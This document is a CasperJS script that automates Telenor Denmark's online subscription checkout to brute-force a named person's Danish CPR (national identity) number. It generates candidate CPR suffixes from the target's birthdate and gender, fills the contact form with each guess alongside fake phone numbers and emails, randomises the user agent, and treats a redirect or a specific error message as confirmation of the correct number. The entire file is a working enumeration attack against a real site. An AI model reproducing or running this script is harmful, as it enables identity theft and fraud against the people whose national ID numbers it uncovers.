var casper = require('casper').create({
  pageSettings: {
    loadImages:  false,        // do not load images
    loadPlugins: false         // do not load NPAPI plugins (Flash, Silverlight, ...)
  },
  verbose: false,
  // logLevel: "debug",
  waitTimeout: 10000
});

/***** include scrapeUtils utilities *********************/

var colorizer = require('colorizer').create('Colorizer');
var generateCpr = require('./generateCpr.js').generateCpr;
var generateLastNames = require('./generateLastNames.js');
var helpers = require('./helpers.js').helpers(casper);
var cprList = [];

/***** command line options/arguments ********************/

var cliOptions = casper.cli.options;

var person = {
    firstName: decodeURI(cliOptions.firstName).replace(/\+/g, " "),
    lastName: decodeURI(cliOptions.lastName).replace(/\+/g, " "),
    dob: helpers.zeroPad(cliOptions.dob, 6),
    gender: cliOptions.gender,
    lastNames: []
};

var startFrom = cliOptions.startFrom || 0;


/**************************************************/

// begin
casper.start();

casper.then(function(){
  // generate list of cpr numbers
  cprList = generateCpr.init(person.dob, person.gender);

  // generate full names with different combinations
  person.lastNames = generateLastNames.init(person.lastName);

  console.log(person.firstName);
  console.log(person.lastName);
  console.log(person.dob);
  console.log(person.gender);
  console.log("Starting from " + cprList[startFrom]);

  // Set viewport size
  this.viewport(1024, 768);

  // set random user agent
  this.userAgent(helpers.getRandomUserAgent());
});

/**************************************************/

// Open Page: Lillenor abonnement oversigt
casper.thenOpen('http://www.telenor.dk/privat/mobilabonnementer/mobilabonnementer/lillenor/index.aspx?icid=megadropdown_mobilabonnementer_lillenor').then(function(){
  console.log('Open start page');
  helpers.clickWhenReady('#purchaseBtn');
});

casper.then(function(){
  console.log('Click: new number');
  helpers.clickWhenReady('#EShop_ChooseNumberXUC1_btnMainNewNumber');
});
// wait for numbers and then choose one
casper.then(function(){
  helpers.clickWhenReady('#subnumbers input');
});
casper.then(function(){
  console.log('Clicking next #1');
  helpers.clickWhenReady('#next');
});

// wait for next page (service.aspx)
casper.then(function(){

  console.log('Clicking next #2');
  // wait for next breadcrump to become active
  this.waitForSelector('.breadcrumb .active.id-1', function(){
    this.click('#next[data-rel="FlowNavigator1_ImageButtonNext"]');
  }, function(){
    console.log("Error at index: 0");
    this.captureSelector('timeout_' + person.dob + '.png', '#content');
  });
});

// Basket page (basket.aspx)
casper.then(function(){
  console.log('Click checkout button');
  helpers.clickWhenReady('#EShop_Basket1_CheckOutImageButton');
});

// click checkbox: accept cpr (LOLZ!)
casper.then(function(){
  console.log('Accept use of cpr');
  helpers.clickWhenReady('#_ContactInformation_ContactInformation1_ctl00_ctl00_cbConsent');
});

casper.then(function(){
  console.log('Start checkCpr');
  checkCpr(startFrom);
});

var checkCpr = function(index){
  var cpr = person.dob + '-' + cprList[index];
  var phone = Math.floor(Math.random() * 69000000) + 30000005;
  var email = helpers.getRandomString(8) + '@gmail.com';

  casper.then(function(){
    var successFunction = function(){

      // fill out form
      this.fill('#dotnet', {
        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbCpr': cpr,
        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbFirstname': person.firstName,
        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbLastname': person.lastNames[index],
        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbPhoneNo': phone,
        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbEmail': email
      }, false);

      // add dummy element, so we know when the page has changed!
      casper.evaluate(function() {
        $('body').append('<p id="casperjs-was-here">Hello</p>');
      });
    };

    var errorFunction = function(){
      console.log("Error at index: " + index);
      this.captureSelector('timeout_' + person.dob + '_' + index + '.png', '#content');
      this.exit();
    };

    // wait for email field (last field in form)
    this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_tbEmail', successFunction, errorFunction);
  });

  // submit
  casper.then(function(){
    helpers.clickWhenReady('.next', index);
  });

  // check response
  casper.then(function(){

    // console.log(cpr);
    // console.log(person.lastNames[index]);

    // We've had a page change!
    this.waitWhileSelector('#casperjs-was-here', function(){

      var message = "";
      if(this.exists('#_ContactInformation_ContactInformation1_ctl00_ctl00_summary')){
        message = this.fetchText('#_ContactInformation_ContactInformation1_ctl00_ctl00_summary').replace(/(\r\n|\n|\r)/gm,"").trim();
      }

      // success if:
      // 1) we are redirect to godkendelse
      // OR
      // 2) we receive a special message which only correct CPR numbers receive :D
      if(this.getCurrentUrl().indexOf("godkend.aspx") !== -1 || message.indexOf("ikke ske automatisk, men ring til Telenor") !== -1){
        console.log("correct: " + cpr);

      // Failure
      }else{
        console.log("wrong: " + cpr);
        // this.captureSelector('incorrect_' + index + '.png', '#content');

        index++;
        if(cprList[index] !== undefined){
          checkCpr(index);
        }
      } // end of else

    // timeout function
    }, function(){
      console.log('Timeout checking CPR #' + index);
      this.captureSelector('timeout_check_cpr_' + index + '.png', '#content');
    }, 40000); // end of waitWhileSelector
  });
};

casper.run(function() {
    console.log("Finished");
    this.exit();
});
